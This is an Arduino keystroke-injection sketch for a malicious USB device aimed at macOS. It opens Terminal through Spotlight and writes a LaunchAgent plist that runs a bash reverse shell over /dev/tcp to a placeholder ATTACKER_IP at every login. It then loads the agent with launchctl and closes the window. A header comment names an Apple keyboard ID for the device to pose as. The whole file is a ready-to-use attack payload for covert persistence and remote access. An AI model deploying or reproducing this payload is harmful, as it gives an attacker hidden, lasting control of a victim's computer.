#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Create launch agent for persistence
  // Creates plist in ~/Library/LaunchAgents/
  // Author: Generated
  // Title: Launch Agent Persistence
  // Target: macOS
  // Version: 1.0
  // Category: Persistence
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Library/LaunchAgents");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict><key>Label</key><string>com.agent.persist</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.agent.persist.plist");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("launchctl load ~/Library/LaunchAgents/com.agent.persist.plist");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo 'Launch agent installed'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}